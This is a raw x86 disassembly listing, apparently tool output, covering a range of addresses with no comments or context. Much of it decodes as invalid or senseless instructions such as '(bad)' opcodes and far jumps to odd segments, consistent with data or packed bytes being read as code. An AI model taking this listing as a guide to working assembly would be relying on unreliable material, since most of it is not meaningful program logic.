  42faab:	add    DWORD PTR [eax],eax
  42faad:	add    BYTE PTR [eax-0x1f],cl
  42fab0:	add    edx,ebp
  42fab2:	lods   al,BYTE PTR ds:[esi]
  42fab3:	add    DWORD PTR [esp+eiz*8],esp
  42fab6:	xchg   ecx,eax
  42fab7:	xor    DWORD PTR [edi-0x670d2847],ecx
  42fabd:	xchg   esp,eax
  42fabe:	or     eax,0xcef3377a
  42fac3:	jmp    0x42fafd
  42fac5:	add    al,0xff
  42fac7:	cmp    ch,BYTE PTR [ebp+0x18]
  42faca:	(bad)  
  42facb:	xchg   edi,eax
  42facc:	cmp    BYTE PTR [ecx+ecx*8+0x5f9002f3],dl
  42fad3:	nop
  42fad4:	cli    
  42fad5:	out    dx,eax
  42fad6:	fyl2xp1 
  42fad8:	mov    dh,BYTE PTR [ebx]
  42fada:	fild   QWORD PTR [edi]
  42fadc:	outs   dx,BYTE PTR ds:[esi]
  42fadd:	lahf   
  42fade:	hlt    
  42fadf:	psllw  mm2,mm6
  42fae2:	out    0xff,eax
  42fae4:	dec    ebp
  42fae5:	(bad)  
  42fae6:	out    0x83,al
  42fae8:	pop    esi
  42fae9:	clc    
  42faea:	jmp    0x42fae3
  42faec:	cld    
  42faed:	or     DWORD PTR [ebp+0xbf80e19],ebx
  42faf3:	xor    bh,bl
  42faf5:	mov    dh,0x62
  42faf7:	sbb    esp,DWORD PTR [esi+0x7ee98f6a]
  42fafd:	sub    BYTE PTR [edi-0x5c],ch
  42fb00:	scas   al,BYTE PTR es:[edi]
  42fb01:	cmp    esi,edx
  42fb03:	jne    0x42faee
  42fb05:	xchg   DWORD PTR [ebp+ebx*1-0x3c12e6a4],eax
  42fb0c:	lds    ebx,FWORD PTR [esi]
  42fb0e:	xchg   ecx,eax
  42fb0f:	rol    BYTE PTR [ebx-0xb],0x5f
  42fb13:	add    DWORD PTR [ebp+esi*4-0x25],edi
  42fb17:	jns    0x42fb89
  42fb19:	xor    BYTE PTR [esi-0xf53ab6f],0xff
  42fb20:	mov    dh,0xa8
  42fb22:	imul   edi,DWORD PTR [ebx+ebx*8-0x1ec7997a],0x7a
  42fb2a:	add    DWORD PTR [eax+0x77],edx
  42fb2d:	jp     0x42fb69
  42fb2f:	lds    ebp,FWORD PTR [edx+0x22]
  42fb32:	cmp    edi,ebp
  42fb34:	rcl    DWORD PTR [eax+0x59ea9513],1
  42fb3a:	ins    BYTE PTR es:[edi],dx
  42fb3b:	xor    bh,BYTE PTR [edi+0x53]
  42fb3e:	inc    ebp
  42fb3f:	mov    edi,DWORD PTR fs:[ecx+0x1b]
  42fb43:	sub    ebp,DWORD PTR [esi]
  42fb45:	xor    eax,0x24202942
  42fb4a:	jle    0x42fb25
  42fb4c:	or     al,BYTE PTR [ebp+0x3ec7f499]
  42fb52:	xchg   edx,eax
  42fb53:	stos   DWORD PTR es:[edi],eax
  42fb54:	xchg   esi,eax
  42fb55:	sub    DWORD PTR [eax+0x239e89a],ecx
  42fb5b:	and    al,0x74
  42fb5d:	xchg   DWORD PTR [ebx-0x1678ad49],eax
  42fb63:	hlt    
  42fb64:	adc    dl,BYTE PTR [esi]
  42fb66:	cmp    bh,BYTE PTR [ecx+ebx*2+0x158c192d]
  42fb6d:	mul    DWORD PTR [ecx]
  42fb6f:	lea    eax,[edx-0x2520d3ac]
  42fb75:	sbb    eax,0xcc71c1c1
  42fb7a:	inc    ecx
  42fb7b:	push   0xc110fcc2
  42fb80:	or     al,0x63
  42fb82:	pop    edi
  42fb83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb84:	and    esi,DWORD PTR [ebp+0x55]
  42fb87:	mov    dh,0xf0
  42fb89:	jb     0x42fb40
  42fb8b:	sub    eax,0x1076ea75
  42fb90:	bound  edi,QWORD PTR [ecx-0x7f356d80]
  42fb96:	sub    eax,0xce79c220
  42fb9b:	test   BYTE PTR [edx],ah
  42fb9d:	jb     0x42fb23
  42fb9f:	out    dx,al
  42fba0:	mov    eax,0xb08c804a
  42fba5:	dec    ah
  42fba7:	dec    esp
  42fba8:	jae    0x42fc0c
  42fbaa:	pop    ebp
  42fbab:	fucomp st(0)
  42fbad:	cmc    
  42fbae:	shl    DWORD PTR [ebp-0x67cc9af9],0x3
	...
  42fc15:	add    BYTE PTR [ebx],cl
  42fc17:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc1d:	call   0x451f:0x9e5607ea
  42fc24:	ss push ebp
  42fc26:	or     al,0x0
  42fc28:	add    al,BYTE PTR [eax]
  42fc2a:	pop    es
  42fc2b:	add    DWORD PTR [eax],eax
  42fc2d:	add    BYTE PTR [eax-0x52cab8fd],al
  42fc33:	cmp    eax,DWORD PTR [edx+0x36]
  42fc36:	inc    eax
  42fc38:	add    ebp,DWORD PTR [esi+0x1d]
  42fc3b:	or     eax,0x9b71fbf2
  42fc40:	lock and al,0xa9
  42fc43:	and    ch,al
  42fc45:	pop    ss
  42fc46:	and    ecx,DWORD PTR [ecx-0x5c]
  42fc49:	mov    eax,ds:0xae8a0cf3
  42fc4e:	cmc    
  42fc4f:	repz cmp al,0xfa
  42fc52:	adc    bl,BYTE PTR [ecx-0x19]
  42fc55:	das    
  42fc56:	cmp    ah,BYTE PTR [eax]
  42fc58:	push   es
  42fc59:	adc    ebp,DWORD PTR [ebx-0xa]
  42fc5c:	mov    ch,0x90
  42fc5e:	fnsave es:[edi+0x4ef50d05]
  42fc65:	dec    esp
  42fc66:	cwde   
  42fc67:	addr16 in eax,0x53
  42fc6a:	dec    DWORD PTR [edi+0x423c6860]
  42fc70:	sub    eax,0x2a641033
  42fc75:	push   esp
  42fc76:	sub    eax,0x8eda25fc
  42fc7b:	call   0xa602:0x8e500447
  42fc82:	jle    0x42fcbd
  42fc84:	jbe    0x42fc82
  42fc86:	dec    esi
  42fc87:	sti    
  42fc88:	ins    BYTE PTR es:[edi],dx
  42fc89:	inc    ebp
  42fc8a:	ds aas 
  42fc8c:	ja     0x42fcaa
  42fc8e:	or     ah,dh
  42fc90:	rcr    BYTE PTR [edi-0x201cb28e],1
  42fc96:	jo     0x42fc74
  42fc98:	fnstsw WORD PTR [ebp+0x5d71801f]
  42fc9e:	mov    esi,DWORD PTR [ebx+0x7c]
  42fca1:	add    bh,dl
  42fca3:	fild   WORD PTR [ebp-0x7b6c0b8c]
  42fca9:	inc    ecx
  42fcaa:	push   edi
  42fcab:	mov    dl,0xa
  42fcad:	int    0x42
  42fcaf:	xchg   ebp,eax
  42fcb0:	sub    cl,BYTE PTR [ecx-0x52]
  42fcb3:	xlat   BYTE PTR ds:[ebx]
  42fcb4:	cli    
  42fcb5:	mov    ch,bh
  42fcb7:	dec    ebp
  42fcb8:	mov    edx,0x513faeb6
  42fcbd:	mov    ch,0x57
  42fcbf:	dec    esi
  42fcc0:	add    edx,edi
  42fcc2:	mov    cl,0x77
  42fcc4:	cmp    al,0x58
  42fcc6:	mov    al,ds:0xd13e85c3
  42fccb:	push   eax
  42fccc:	or     al,BYTE PTR [ebx-0x10]
  42fccf:	jmp    0x12b3:0xc7ab4e07
  42fcd6:	and    al,0x45
  42fcd8:	int3   
  42fcd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fcda:	sub    al,0xee
  42fcdc:	mov    esp,ebp
  42fcde:	jl     0x42fcdd
  42fce0:	sbb    bh,bh
  42fce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fce3:	fcmovnu st,st(3)
  42fce5:	add    eax,DWORD PTR [edi-0x419e8796]
  42fceb:	jle    0x42fd15
  42fced:	jnp    0x42fd49
  42fcef:	jp     0x42fc9c
  42fcf1:	sub    DWORD PTR [eax],esi
  42fcf3:	mov    eax,0xf9ff89b7
  42fcf8:	jecxz  0x42fcd3
  42fcfa:	out    0x81,eax
  42fcfc:	mov    bh,0x14
  42fcfe:	push   ecx
  42fcff:	popa   
  42fd00:	push   ebx
  42fd01:	ror    DWORD PTR [ebx+0x4810a28b],0xf9
  42fd08:	xor    eax,0xb095acb1
  42fd0d:	cmp    DWORD PTR [ecx+0x6c1167d3],esp
  42fd13:	fs mov ebp,0xbc30721f
  42fd19:	or     DWORD PTR [ecx+0x78],esp
  42fd1c:	inc    ebp
  42fd1d:	xor    bl,al
  42fd1f:	add    ebp,DWORD PTR [edi+0x7846839]
  42fd25:	xchg   BYTE PTR [ecx+0x40779520],ah
  42fd2b:	hlt    
  42fd2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd2d:	sbb    ebx,eax
  42fd2f:	cdq    
  42fd30:	adc    ebx,DWORD PTR [edx+0xf687ad]
	...
  42fd96:	dec    eax
  42fd97:	rol    dl,0xf0
  42fd9a:	retf   0x7af2
  42fd9d:	clc    
  42fd9e:	int3   
  42fd9f:	jae    0x42fda8
  42fda1:	adc    al,0x47
  42fda3:	out    dx,eax
  42fda4:	xchg   ebp,eax
  42fda5:	scas   al,BYTE PTR es:[edi]
  42fda6:	adc    eax,DWORD PTR [ecx]
  42fda8:	add    al,BYTE PTR [eax]
  42fdaa:	pop    es
  42fdab:	add    DWORD PTR [eax],eax
  42fdad:	add    BYTE PTR [edi],al
  42fdaf:	and    esi,DWORD PTR [ebp+0x16]
  42fdb2:	les    edi,FWORD PTR [eax+edx*1]
  42fdb5:	pusha  
  42fdb6:	pushf  
  42fdb7:	push   edx
  42fdb8:	sbb    DWORD PTR ss:[ebp+0x555740c],edx
  42fdbf:	inc    eax
  42fdc0:	adc    al,BYTE PTR [edi-0x29e996b2]
  42fdc6:	push   ecx
  42fdc7:	int3   
  42fdc8:	out    dx,eax
  42fdc9:	push   esi
  42fdca:	leave  
  42fdcb:	mov    dl,0x4c
  42fdcd:	inc    eax
  42fdce:	ja     0x42fe09
  42fdd0:	jmp    0x42fd81
  42fdd2:	hlt    
  42fdd3:	in     eax,dx
  42fdd4:	out    0x13,al
  42fdd6:	sub    esi,DWORD PTR [ebx-0x15b372df]
  42fddc:	xor    ebp,DWORD PTR [eax+0x56d00003]
  42fde2:	sub    eax,esp
  42fde4:	neg    DWORD PTR [edx+0x5ecb314c]
  42fdea:	in     eax,0x25
  42fdec:	cmp    ah,BYTE PTR [eax]
  42fdee:	cmp    DWORD PTR [eax+ebp*4+0x5e],ebp
  42fdf2:	std    
  42fdf3:	out    dx,eax
  42fdf4:	aas    
  42fdf5:	jg     0x42fdbe
  42fdf7:	xor    esp,DWORD PTR [ecx-0x478f15ac]
  42fdfd:	popa   
  42fdfe:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  42fe00:	jg     0x42fe67
  42fe02:	popa   
  42fe03:	pop    esi
  42fe04:	imul   edx,DWORD PTR [edi-0x7aa4e891],0x2eea7384
  42fe0e:	lea    edi,[esi+0x2ca9fcca]
  42fe14:	mov    WORD PTR [ebp+0x510cb96d],?
  42fe1a:	mov    es,eax
  42fe1c:	or     eax,0xc2230847
  42fe21:	or     DWORD PTR [esp+ebx*2+0xcb0a3ac],ebp
  42fe28:	ss jns 0x42fdb5
  42fe2b:	sbb    eax,0xf5d7ae05
  42fe30:	jmp    0x42fe3c
  42fe32:	shl    bh,1
  42fe34:	mov    esi,0x857e16ba
  42fe39:	push   ecx
  42fe3a:	sbb    BYTE PTR [eax+0x75],ah
  42fe3d:	clc    
  42fe3e:	xchg   esp,eax
  42fe3f:	shl    BYTE PTR [ebp+0x294d2ef4],1
  42fe45:	xor    ch,BYTE PTR [esi]
  42fe47:	push   0x588134cb
  42fe4c:	mov    al,ds:0x51b1095b
  42fe51:	xor    eax,0x55a8c30c
  42fe56:	mov    ebx,0x30515073
  42fe5b:	loop   0x42fdfa
  42fe5d:	xor    DWORD PTR [ebx-0x24],edi
  42fe60:	and    dh,cl
  42fe62:	(bad)  [ebp-0x17]
  42fe65:	xor    al,0x7
  42fe67:	call   0x13f7:0xee86debe
  42fe6e:	aas    
  42fe6f:	push   esi
  42fe70:	mov    ch,cl
  42fe72:	in     eax,0xed
  42fe74:	adc    ecx,DWORD PTR [ebp-0x6a05d306]
  42fe7a:	test   eax,0x39e254b2
  42fe7f:	sub    ecx,DWORD PTR [ebp+0x62ac7d01]
  42fe85:	aad    0x3
  42fe87:	js     0x42fe71
  42fe89:	mov    ds,WORD PTR [edx]
  42fe8b:	mov    ch,0x41
  42fe8d:	ja     0x42fe28
  42fe8f:	xchg   esp,eax
  42fe90:	cli    
  42fe91:	mov    eax,ds:0x9e4cbda2
  42fe96:	cmp    DWORD PTR [ebp-0x2066fc37],esp
  42fe9c:	or     al,0x99
  42fe9e:	imul   eax,DWORD PTR [edx],0x5559a9ca
  42fea4:	sub    edx,DWORD PTR [esp+ebp*2+0x78]
  42fea8:	es cmc 
  42feaa:	jne    0x42fe79
  42feac:	cdq    
  42fead:	cmp    ah,dh
  42feaf:	push   ds
  42feb0:	fadd   DWORD PTR [edx+eiz*1]
  42feb3:	jae    0x42fead
	...
  42ff15:	add    BYTE PTR [edi+eiz*2],al
  42ff18:	std    
  42ff19:	aaa    
  42ff1a:	(bad)  
  42ff1b:	mov    edi,0x2c6b77ce
  42ff20:	mov    WORD PTR [ecx],es
  42ff22:	in     eax,dx
  42ff23:	ins    DWORD PTR es:[edi],dx
  42ff24:	dec    eax
  42ff25:	lahf   
  42ff26:	sbb    al,BYTE PTR [edx]
  42ff28:	add    al,BYTE PTR [eax]
  42ff2a:	pop    es
  42ff2b:	add    DWORD PTR [eax],eax
  42ff2d:	add    BYTE PTR [ecx+0x57],dh
  42ff30:	mov    ecx,0x147c99f7
  42ff35:	icebp  
  42ff36:	mov    esi,0xb4a8e2e0
  42ff3b:	scas   eax,DWORD PTR es:[edi]
  42ff3c:	xor    eax,0xc92dedd
  42ff41:	or     BYTE PTR [edx+0x4bb4ada9],0x60
  42ff48:	je     0x42ff94
  42ff4a:	push   ebp
  42ff4b:	lea    eax,[ecx-0x3f0689ca]
  42ff51:	sub    dl,BYTE PTR [ecx-0x23]
  42ff54:	jmp    0x42fefe
  42ff56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ff57:	repz (bad) [ebp+0x23e5f9bc]
  42ff5e:	pop    esi
  42ff5f:	jge    0x42ff59
  42ff61:	int    0x8c
  42ff63:	mov    esp,DWORD PTR [ebp-0x445e3908]
  42ff69:	inc    ebx
  42ff6a:	jno    0x42fef3
  42ff6c:	add    al,0x1e
  42ff6e:	or     esi,DWORD PTR ds:0x371192f7
  42ff74:	or     DWORD PTR [edx],esi
  42ff76:	ret    
  42ff77:	or     ecx,DWORD PTR [ecx]
  42ff79:	enter  0xa033,0x38
  42ff7d:	dec    esi
  42ff7e:	sti    
  42ff7f:	cmp    DWORD PTR [edx-0x4c],0xffffff9b
  42ff83:	mov    esi,0x492cfa48
  42ff88:	sub    eax,DWORD PTR [ebx]
  42ff8a:	jmp    0x9160b20b
  42ff8f:	xchg   ecx,eax
  42ff90:	cli    
  42ff91:	mov    WORD PTR [edx-0x18557cee],es
  42ff97:	loope  0x42ff60
  42ff99:	(bad)  
  42ff9a:	pop    esp
  42ff9b:	pop    esi
  42ff9c:	mov    ebx,0x3e6dc128
  42ffa1:	cdq    
  42ffa2:	mov    dh,0xfb
  42ffa4:	adc    al,0xbc
  42ffa6:	je     0x430005
  42ffa8:	icebp  
  42ffa9:	xor    al,0x73
  42ffab:	mov    eax,?
  42ffad:	mov    ch,0x50
  42ffaf:	mov    edx,0xdeffeb5b
  42ffb4:	rcl    DWORD PTR [ecx-0x6954cd18],0xcc
  42ffbb:	pop    edi
  42ffbc:	mov    cs,edx
  42ffbe:	pushf  
  42ffbf:	xchg   BYTE PTR ds:0xa9588d30,dh
  42ffc5:	dec    ebp
  42ffc6:	dec    ebx
  42ffc7:	jnp    0x42ff5c
  42ffc9:	mov    dl,0x90
  42ffcb:	pop    eax
  42ffcc:	punpcklwd mm1,mm5
  42ffcf:	xchg   ebx,eax
  42ffd0:	pop    esp
  42ffd1:	mov    dh,0xd
  42ffd3:	out    dx,al
  42ffd4:	cmp    eax,0xeb81024
  42ffd9:	and    DWORD PTR [ecx-0x7892871e],eax
  42ffdf:	pop    ecx
  42ffe0:	stos   DWORD PTR es:[edi],eax
  42ffe1:	clc    
  42ffe2:	jbe    0x42ff81
  42ffe4:	cmp    al,BYTE PTR [esi]
  42ffe6:	(bad)
  42ffea:	push   ebx
  42ffeb:	dec    ebp
  42ffec:	bound  eax,QWORD PTR [edx-0x762dc939]
  42fff2:	add    bl,BYTE PTR [eax+edi*8+0x2b5abafa]
  42fff9:	ins    BYTE PTR es:[edi],dx
  42fffa:	fist   DWORD PTR [eax-0x1359b501]
  430000:	mov    edx,0xcab41479
  430005:	clc    
  430006:	dec    esp
  430007:	lahf   
  430008:	dec    ebp
  430009:	cmp    ecx,eax
  43000b:	sub    ebx,0x4b
  43000e:	das    
  43000f:	fst    DWORD PTR [edi-0x1bc2e5fc]
  430015:	mov    edi,0xfb365ff3
  43001a:	and    BYTE PTR [esi+0x7a],bl
  43001d:	pop    ebx
  43001e:	and    ecx,edx
  430020:	jmp    0x5b44:0xa0421e1c
  430027:	pop    esp
  430028:	je     0x42ffc6
  43002a:	pop    edi
  43002b:	push   eax
  43002c:	mov    esi,0xe4faea4a
  430031:	pop    esp
  430032:	pop    edi
  430033:	js     0x42ffe6
	...
  430095:	add    bh,al
  430097:	ins    DWORD PTR es:[edi],dx
  430098:	aam    0xb5
  43009a:	(bad)  
  43009b:	mov    ebp,0x87aa7fe7
  4300a0:	mov    bl,0x9f
  4300a2:	mov    bl,0x25
  4300a4:	dec    esp
  4300a5:	mov    ah,0x21
  4300a7:	add    eax,DWORD PTR [edx]
  4300a9:	add    BYTE PTR [ebx],ah
  4300ab:	add    BYTE PTR [eax],al
  4300ad:	add    ch,al
  4300af:	popa   
  4300b0:	lods   eax,DWORD PTR ds:[esi]
  4300b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4300b2:	cld    
  4300b3:	dec    ebx
  4300b4:	xchg   ecx,eax
  4300b5:	icebp  
  4300b6:	imul   edi,DWORD PTR [ebx+0x1d5ffedc],0x15
  4300bd:	and    bl,dh
  4300bf:	dec    edx
  4300c0:	ret    0x4244
  4300c3:	pop    ecx
  4300c4:	dec    edx
  4300c5:	pushf  
  4300c6:	sub    al,0x83
  4300c8:	inc    edx
  4300c9:	aas    
  4300ca:	imul   ebp,DWORD PTR [eax-0x71866887],0x2a
	...
  430114:	add    BYTE PTR [eax],al
  430116:	dec    ebp
  430117:	push   ebp
  430118:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  43011e:	mov    esp,ebp
  430120:	or     al,ah
  430122:	dec    ebp
  430123:	add    bh,al
  430125:	add    BYTE PTR [eax],cl
  430127:	add    BYTE PTR [eax],al
  430129:	mov    DWORD PTR [eax],0x3ef44545
  43012f:	xor    eax,0x9c8b8500
  430134:	hlt    
  430135:	clc    
  430136:	retf   
  430137:	(bad)  
  430138:	enter  0x4d45,0xb8
  43013c:	mov    esi,DWORD PTR [esp+esi*8]
  43013f:	test   ebx,ecx
  430141:	pushf  
  430142:	enter  0x4df8,0x8b
  430146:	mov    DWORD PTR [ebp+0x8],0x894708
  43014d:	inc    ebp
  43014e:	mov    ebp,0xff8bfffc
  430153:	dec    ebp
  430154:	mov    ch,0xf4
  430156:	call   DWORD PTR [ebx-0x1]
  430159:	mov    ebx,0x8005322
  43015e:	call   DWORD PTR [ecx+0x8]
  430161:	pop    es
  430162:	jmp    0xb8:0x9cb4533
  430169:	call   0xc3:0x32f4728b
  430170:	call   0x8989:0x3c83203
  430177:	dec    ebp
  430178:	or     ah,al
  43017a:	inc    ebp
  43017b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430181:	xor    eax,DWORD PTR [eax]
  430183:	retf   
  430184:	ret    
  430185:	add    eax,esi
  430187:	enter  0x8945,0x64
  43018b:	dec    ebp
  43018c:	sbb    ah,cl
  43018e:	add    BYTE PTR [ebx-0xb87b277],cl
  430194:	dec    DWORD PTR [ebx-0xbcfb275]
  43019a:	test   DWORD PTR [ebx],esi
  43019c:	dec    ebx
  43019e:	inc    DWORD PTR [ebx]
  4301a0:	inc    eax
  4301a1:	enter  0x8989,0x64
  4301a5:	(bad)  
  4301a6:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4301aa:	cld    
  4301ab:	dec    DWORD PTR [ebp-0xa90001]
  4301b1:	push   edi
  4301b2:	mov    BYTE PTR [edx+0x1],ch
  4301b5:	and    BYTE PTR [eax],al
  4301b7:	pop    ecx
  4301b8:	inc    ebp
  4301b9:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4301bf:	push   0xffffff89
  4301c1:	pop    ecx
  4301c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4301c3:	dec    ebp
  4301c4:	add    BYTE PTR [ecx+0x45fc088b],cl
  4301ca:	jne    0x430214
  4301cc:	lea    eax,[eax]
  4301ce:	fs (bad) 
  4301d0:	dec    DWORD PTR [eax]
  4301d2:	mov    DWORD PTR [eax],eax
  4301d4:	test   al,0x0
  4301d6:	add    BYTE PTR [ebp-0x18],cl
  4301d9:	xor    ebp,DWORD PTR [edx]
  4301db:	add    eax,DWORD PTR [eax]
  4301dd:	mov    eax,eax
  4301df:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4301e6:	inc    ebp
  4301e7:	mov    DWORD PTR [ebx+0x459408],ecx
  4301ed:	popa   
  4301ee:	mov    esp,DWORD PTR [ebp-0x75]
  4301f1:	(bad)  
  4301f2:	cld    
  4301f3:	inc    eax
  4301f4:	cmp    bh,0x1
  4301f7:	lea    eax,[eax]
  4301f9:	and    BYTE PTR [eax],al
  4301fb:	inc    DWORD PTR [ecx-0x18]
  4301fe:	mov    ecx,DWORD PTR [ebx]
  430200:	cld    
  430201:	add    BYTE PTR [ecx+0x75014d],cl
  430207:	(bad)  
  430208:	xchg   ebp,eax
  430209:	sar    bh,1
  43020b:	inc    eax
  43020c:	inc    DWORD PTR [eax]
  43020e:	mov    eax,DWORD PTR [ebp-0x4]
  430211:	xor    edx,DWORD PTR [edx+0x7201be]
  430217:	add    BYTE PTR [edx],dl
  430219:	(bad)  
  43021a:	nop
  43021b:	inc    ebp
  43021c:	add    BYTE PTR [ebx-0x5afb0c00],cl
  430222:	mov    al,0xff
  430224:	add    bh,bh
  430226:	add    BYTE PTR [ebx],dh
  430228:	inc    DWORD PTR [ebx]
  43022a:	sbb    al,0x89
  43022c:	jne    0x43020a
  43022e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430234:	mov    eax,DWORD PTR [ebp-0xff0048]
  43023a:	mov    DWORD PTR [eax-0x70],0xee70e989
  430241:	inc    DWORD PTR [ebp-0x75]
  430244:	(bad)  [esp+ebp*8]
  430247:	test   DWORD PTR [esi-0x1],esp
  43024a:	inc    ebp
  43024b:	(bad)  
  43024c:	aas    
  43024d:	inc    ebp
  43024e:	(bad)  
  43024f:	lea    edi,[eax+edi*2-0x1]
  430253:	inc    edi
  430255:	mov    DWORD PTR [ecx],edi
  430257:	mov    al,ds:0x8b8000c7
  43025c:	out    dx,al
  43025d:	cld    
  43025e:	loopne 0x4301ed
  430260:	inc    ebp
  430261:	(bad)  
  430262:	in     al,dx
  430263:	(bad)  
  430264:	fisttp WORD PTR [eax+0x8801c7]
  43026a:	jecxz  0x4302b1
  43026c:	out    dx,al
  43026d:	inc    DWORD PTR [ebp-0x4]
  430270:	out    0x8d,eax
  430272:	aas    
  430273:	(bad)  
  430274:	call   0xcb2d78
  430279:	add    DWORD PTR [ebx-0x7f590400],ecx
  43027f:	add    BYTE PTR [ecx],al
  430281:	test   DWORD PTR [eax],eax
  430283:	wrmsr  
  430285:	jae    0x430272
  430287:	add    BYTE PTR [eax],al
  430289:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43028f:	add    esp,edi
  430291:	add    BYTE PTR [eax+0x450108],al
  430297:	mov    edi,DWORD PTR [ebp-0x6c]
  43029a:	add    DWORD PTR [eax],0x4
  43029d:	mov    eax,DWORD PTR [ebp+0x3]
  4302a0:	mov    edi,DWORD PTR [esp+edi*8]
  4302a3:	dec    ebp
  4302a4:	nop
  4302a5:	mov    eax,DWORD PTR [ecx]
  4302a7:	fadd   DWORD PTR [eax]
  4302a9:	add    BYTE PTR [ecx*4-0xafa000],al
  4302b0:	inc    ebp
  4302b1:	push   edx
  4302b2:	call   DWORD PTR [ebp-0x7b]
  4302b5:	mov    esi,DWORD PTR [ebp-0x74]
  4302b8:	mov    eax,DWORD PTR [eax]
  4302ba:	cld    
  4302bb:	mov    eax,DWORD PTR [eax+0x880103]
  4302c1:	add    BYTE PTR [ebp+0x6a],bh
  4302c4:	cmp    edi,0x10
  4302c7:	mov    WORD PTR [ebp+0x0],es
  4302ca:	mov    edx,DWORD PTR [edx-0x4]
  4302cd:	push   ecx
  4302ce:	nop
  4302cf:	inc    DWORD PTR [ecx]
  4302d1:	cld    
  4302d2:	add    BYTE PTR [ebp-0x26],bh
  4302d5:	mov    eax,DWORD PTR [eax]
  4302d7:	cld    
  4302d8:	push   eax
  4302d9:	nop
  4302da:	inc    ebp
  4302db:	add    edi,edi
  4302dd:	add    BYTE PTR [ebx+0x4de0f445],cl
  4302e3:	call   0x9446ca1b
  4302e8:	cmp    esp,ebx
  4302ea:	movntq QWORD PTR [esi],mm6
  4302ed:	mov    DWORD PTR [eax],0xb87c8b98
  4302f3:	test   ebx,eax
  4302f5:	jmp    DWORD PTR [esi-0x1]
  4302f8:	int    0xe9
  4302fa:	sub    esp,esp
  4302fc:	add    eax,DWORD PTR [ebp-0x30]
  4302ff:	fild   WORD PTR [ebp+0x3f]
  430302:	cmp    eax,edi
  430304:	je     0xc243e726
  43030a:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  430311:	(bad)  
  430312:	jne    0x4302a0
  430314:	mov    ebx,ecx
  430316:	cld    
  430317:	jl     0x43035e
  430319:	cmp    DWORD PTR [ebx+0x50b400],ecx
  43031f:	inc    ebp
  430320:	call   0xeb2cb0
  430325:	add    BYTE PTR [ebx-0x7f170301],cl
  43032b:	add    DWORD PTR es:[eax],eax
  43032e:	add    al,al
  430330:	xor    BYTE PTR [eax+0x3f],dl
  430333:	inc    ebp
  430334:	add    BYTE PTR [ebx+0xfcd88b],cl
  43033a:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430340:	add    DWORD PTR [ecx+0x458be845],ecx
  430346:	fmul   DWORD PTR [ebx+0x8bb800]
  43034c:	cld    
  43034d:	call   0xd82e12
  430352:	dec    DWORD PTR [ebx+0x108ee8ff]
  430358:	add    al,al
  43035a:	push   eax
  43035b:	es inc ebp
  43035d:	inc    ebp
  43035e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430364:	dec    DWORD PTR [ebx-0x3ff70301]
  43036a:	mov    DWORD PTR gs:[eax],eax
  43036d:	call   0x8b6b4932
  430372:	inc    ebp
  430373:	mov    eax,0xe8d8008b
  430378:	add    BYTE PTR [ecx],ch
  43037a:	mov    eax,DWORD PTR [eax]
  43037c:	cld    
  43037d:	mov    eax,eax
  43037f:	call   0x462b13d9
  430384:	sub    DWORD PTR [ebx-0x3c743000],ecx
  43038a:	cld    
  43038b:	mov    BYTE PTR [eax+0x8401c1],0x1
  430392:	xor    BYTE PTR [eax],al
  430394:	push   edi
  430395:	inc    ebp
  430396:	mov    DWORD PTR [ebx],esi
  430398:	in     al,0xb9
  43039a:	inc    ebp
  43039b:	lea    ecx,[ebx-0x3c370301]
  4303a1:	dec    ebp
  4303a2:	call   0x8dc1:0x308328b
  4303a9:	xchg   DWORD PTR [eax+0x1],eax
  4303ac:	inc    DWORD PTR [eax]
  4303ae:	call   0x432cf8
  4303b3:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4303b9:	jge    0x4303ee
  4303bb:	mov    eax,DWORD PTR [ebx]
  4303bd:	cld    
  4303be:	lea    edx,[eax+0xff0120]
  4303c4:	call   0x432d56
  4303c9:	push   eax
  4303ca:	inc    DWORD PTR [ebp-0x1c]
  4303cd:	mov    ecx,DWORD PTR [ebp-0x58]
  4303d0:	xor    eax,DWORD PTR [eax]
  4303d2:	add    edi,edi
  4303d4:	cmp    ebp,eax
  4303d6:	jne    0x4303fe
  4303d8:	mov    DWORD PTR [eax],0x8b004dd8
  4303de:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4303e5:	mov    eax,ebx
  4303e7:	cld    
  4303e8:	test   BYTE PTR [eax+0x32019a],bh
  4303ee:	mov    DWORD PTR [ebp+0x8],esi
  4303f1:	xor    eax,DWORD PTR [ebp-0x73]
  4303f4:	test   DWORD PTR [esp+esi*2-0x1],edi
  4303f8:	mov    ebp,eax
  4303fa:	mov    eax,0x33004d29
  4303ff:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  430405:	add    DWORD PTR [eax],eax
  430407:	add    BYTE PTR [ebp+0x30],al
  43040a:	mov    edx,DWORD PTR [edi-0x48]
  43040d:	add    ebx,0xffffffe4
  430410:	test   bp,cx
  430413:	je     0x430440
  430415:	mov    eax,DWORD PTR [ebx]
  430417:	cld    
  430418:	sar    BYTE PTR [eax+0x3b0145],1
  43041e:	pcmpeqw mm4,mm6
  430421:	xor    edi,edi
  430423:	lea    ecx,[ebx-0x239e7470]
  430429:	add    BYTE PTR [ebp+0x50],cl
  43042c:	cmp    eax,DWORD PTR [ebp+0x75]
  43042f:	mov    ebp,DWORD PTR [eax-0x68]
  430432:	test   DWORD PTR [eax],eax
  430434:	clc    
  430435:	push   DWORD PTR [ebp-0x1]
  430438:	lea    ecx,[eax]
  43043a:	int3   
  43043b:	inc    ebp
  43043c:	call   0xfb34cc
  430441:	jne    0x43043b
